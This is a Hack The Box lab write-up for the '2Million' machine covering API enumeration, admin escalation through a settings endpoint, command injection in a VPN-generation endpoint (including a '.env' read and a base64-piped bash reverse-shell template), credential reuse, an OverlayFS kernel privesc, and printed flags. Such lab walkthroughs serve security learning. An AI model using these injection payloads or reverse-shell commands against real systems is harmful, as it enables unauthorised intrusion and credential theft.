---
title: HTB 7 - 2Million
tag: htb
category: cyber
---

## Comments

I had already finished the available machines this season, so decided to try an older machine 2Million.

This was an easy box, except that I got tripped up trying to get the RCE going. 

My curl requests while enumerating some critical API endpoints were returning empty, so I thought that there was nothing there. If I had checked the same requests with Burpsuite, I would have seen that there was actually content being returned in the response. I believe this was because accessing the API listing directory is only available to authenticated users. Hence, Burpsuite contained the necessary cookies to verify my request while cURL did not.

Overall, this one was filled with enough breadcrumbs to follow without much external help.

## Walkthrough

TARGET:

    10.10.11.221

### Enumeration

**Scan**

Starting with nmap scan:

    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    syn-ack nginx
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Did not follow redirect to http://2million.htb/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

This is a regular webserver with standard SSH capabilities.

**Fuzzing**

Nothing found via DNS fuzz. Directory fuzzing only gives the directories that we can already find from navigating the main page.

    /invite
    /register
    /login
    /logout

Reading the website in detail, it asks us to try to hack the invite page at `http://2million.htb/invite`, and hints that this is the gateway to the machine.

Looking at the invite source code:

    ```javascript
    <!-- scripts -->
    <script src="/js/htb-frontend.min.js"></script>
    <script defer src="/js/inviteapi.min.js"></script>
    <script defer>
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
    </script>
    ```
We see a call to `inviteapi.min.js` right at the start. It then takes the user input and checks if it matches the invite code using the `/api/v1/invite/verify` method. If it matches, it takes the user to the `/register` page.

Inside `inviteapi.min.js` we see some obfuscated JS code:

    ```javascript
    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
    ```

I used the online [Beautifier](https://beautifier.io/) tool to de-obfuscate the code and get:

    ```javascript
    function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(
            response) {
            console.log(
                response
                )
        },
        error: function(
            response) {
            console.log(
                response
                )
        }
    })
    }

    function makeInviteCode() {
        $.ajax({
            type: "POST",
            dataType: "json",
            url: '/api/v1/invite/how/to/generate',
            success: function(
                response) {
                console.log(
                    response
                    )
            },
            error: function(
                response) {
                console.log(
                    response
                    )
            }
        })
    }
    ```

The 2nd method: `makeInviteCode()` tells us that the code is generated from `POST`-ing to the API `/api/v1/invite/how/to/generate`.

### Foothold

Make an API call using cURL:

    curl http://2million.htb/api/v1/invite/how/to/generate --data ""

    >>
    {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}

The response is encrypted with a ROT-13 algorithm. Once its decoded using any online tool, we get:
    
    "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr"
    >> "In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate"

Following the instructions...

    curl http://2million.htb/api/v1/invite/generate --data ""

    >>
    {"0":200,"success":1,"data":{"code":"SFdNNFktUk9QN1ItTjIwSTItQklSQjM=","format":"encoded"}}

The invite code is still encoded (looks like base64), so we can simply decode it to get the final invite code:

    HWM4Y-ROP7R-N20I2-BIRB3

*Note that the invite codes are randomly generated each time, so this code may long be invalid by the time you try it*

We take this code and put it in the `/invite` use input field. From there, we just follow the instructions to signup and now we have access to the app.

### Exploit

There isn't anything interesting on the site other than the 'Access' tab. It tells us how to generate an OpenVPN file. Checking the various links, they mainly point to `/api/v1/...` endpoints.

Usually APIs will have a listing of endpoints that describes what each method does and how to use it. We can try the usual namings for this listing:

    /api/v1/endpoints
    /api/v1/docs
    /api/v1

I made a mistake here and used cURL instead of Burpsuite. These resources are only accessible by authenticated users, so I was not getting any response in cURL and thought that these weren't the right endpoints. In Burpsuite, the cookie (`PHPSESSID` tagged to the verified user) is stored after logging in with our verified user account we just created, so the same request will be allowed.

The `GET` request to `/api/v1` returns the API listing:

    {
    "v1": { 
        "user": {
        "GET": {
            "/api/v1": "Route List",  
            "/api/v1/invite/how/to/generate": "Instructions on invite code generation", 
            "/api/v1/invite/generate": "Generate invite code",
            "/api/v1/invite/verify": "Verify invite code",
            "/api/v1/user/auth": "Check if user is authenticated",
            "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
            "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
            "/api/v1/user/vpn/download": "Download OVPN file"
        },
        "POST": {
            "/api/v1/user/register": "Register a new user",
            "/api/v1/user/login": "Login with existing user"
        }
        },
        "admin": {
        "GET": {
            "/api/v1/admin/auth": "Check if user is admin"
        },
        "POST": {
            "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
        },
        "PUT": {
            "/api/v1/admin/settings/update": "Update user settings"
        }
        }
    }
    }

First, we can check if we are admin. Nope. Next, we can try to `PUT` some data that will make us admin.

**Remember to add `Content-Type:application/json` in the headers otherwise you will get `Invalid Content` response.**

    PUT /api/v1/admin/settings/update HTTP/1.1
    Host: 2million.htb
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: close
    Referer: http://2million.htb/home/access
    Cookie: PHPSESSID=5bffue64mdl36mh7476v5h8v9e
    Upgrade-Insecure-Requests: 1
    Content-Length: 88
    Content-Type: application/json

    {
    "user": "user",
    "admin": "true",
    "email":"user@gmail.com"
    }

There is a response and a warning message:

    {"status":"danger","message":"Missing parameter: is_admin"}

After changing `admin` to `is_admin`, another message:

    {"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}

Finally, changing `true` to `1` lets us add our `user` to admin:

    {"id":18,"username":"user","is_admin":1}

Now that we are admin, we can run the `/admin` APIs some of which may have direct system access. `/api/v1/admin/vpn/generate` seems promising as it allows us to `POST` data, potentially allowing Command Line injection.

The normal behaviour of `/vpn/generate` is to take in a username string and then populate an OpenVPN file with that string. When we pass `{"username":"hellotest"}` into the `POST`, we get an OpenVPN file which contains `hellotest` in some parts:

    ...

    Subject: C=GB, ST=London, L=London, O=hellotest, CN=hellotest
    ...

The server is likely using PHP to parse the `username` and send it to the system.

We can do a basic test:

    {"username":"hellotest; whoami;"}
    >>> www-data

Let's try to print some important webserver info:

    {"username":"hellotest;cat /var/www/html/.env;"}

    >>
    DB_HOST=127.0.0.1
    DB_DATABASE=htb_prod
    DB_USERNAME=admin
    DB_PASSWORD=SuperDuperPass123

This means we can also reverse shell:

    {"username":"hellotest;bash -c 'echo YOUR_PAYLOAD_HERE|base64 -d|bash -i';"}

We can upgrade our shell:

    python3 -c 'import pty; pty.spawn("/bin/bash")'

### Lateral movement

Once inside, we can explore the system. Note that we are in the `www-data` user, which has limited rights. The actual user we are interested in is `admin`. Since we have database credentials from earlier, we can take a look inside.

Check for SQL instance running (PHP runs with SQL):

    ps -aux | grep sql
    
    >>
    mysql       1268  0.4  2.1 1548084 87012 ?       Ssl  Oct20  10:32 /usr/sbin/mariadbd

Log into the database and explore:

    mysql -u admin -p htb_prod
    Enter password: SuperDuperPass123

    show tables;

    +--------------------+
    | Tables_in_htb_prod |
    +--------------------+
    | invite_codes       |
    | users              |
    +--------------------+
    2 rows in set (0.001 sec)



    select * from users;
    +----+----------------+----------------------------+--------------------------------------------------------------+----------+
    | id | username       | email                      | password                                                     | is_admin |
    +----+----------------+----------------------------+--------------------------------------------------------------+----------+
    | 11 | TRX            | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
    | 12 | TheCyberGeek   | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
    | 13 | Hatim          | hatim@hello.com            | $2y$10$PWuhiMC1r.17W09T2jjH3eRz4/3nZYF.FuS6rSZS9ziqpPG7ChPrW |        0 |
    | 14 | Admin          | Admin@email.com            | $2y$10$tm0WQxyRHYoHOY4W64uPJuSGkL9LAc8aKbNi6V/pMXQQHAzkZ7/Xy |        0 |
    | 15 | user0          | user0@mail.com             | $2y$10$qv7pjcYArb9DQwX3FjSrj.0hVauifK6IkwPfcEeIH9p9Q5y6VMIW2 |        0 |
    | 16 | NKH            | nkh@nkhs.xyz               | $2y$10$.ewbGiAvyuXuiMJRAfg8wuGgV8tgBDyPinH/zfexdUx8klaY03o3y |        0 |
    | 17 | test           | test@2million.htb          | $2y$10$RrVvZOdTenFSif50nNxG6OTTFhoGQNAKyxYuH3/QmLk/sdlv3i7t6 |        0 |
    | 18 | sierraarellano | sierraarellano@gmail.com   | $2y$10$KHQT4XrkfSLi2B8GWzaKh.naxLnMX972jEB89G6HQT3neaYp5QU7i |        1 |
    +----+----------------+----------------------------+--------------------------------------------------------------+----------+

These passwords are not actually useful since they are just accounts created by the other users playing the box.

Another method, we can try to simply `su` into the `admin` account. Thankfully, `admin` reuses his password for the system and the database: `SuperDuperPass123`. We can get the user.txt = 9bab2c3fe6ee025fb11be6cf829f5710.

### Privesc

`sudo -l` doesn't work, and neither does `ps -aux`. We check the kernel version next: `uname -r` and see that it is running on `5.15.70-051570-generic`. 

Luckily we just did a similar privesc on the [Analytics](https://olivesarenice.github.io/posts/htb-analytics/) machine. This version is vulnerable to a similar OverlayFS exploit. The one used in Analytics doesn't work though, as that was back in 2021. The latest version is CVE-2023-0386 for which there is a [PoC](https://github.com/sxlmnwb/CVE-2023-0386).

We follow the instructions from the PoC and send the exploit over to the target. For this exploit, we need 2 terminals up on the target to run 2 different files. The first terminal is our reverse shell, and the second can be created by `ssh`-ing into `admin`. 

root.txt = 886aa10c8992e94229e6fd6c65a5a92b

*The whole reverse shell method was not strictly required since we could have `ssh` in once we found `admin` and `SuperDuperPass123`, but there was no gurantee that the database credentials were the same as the machine credentials*

<br>
<br>

*That's all for tonight, ciao.*


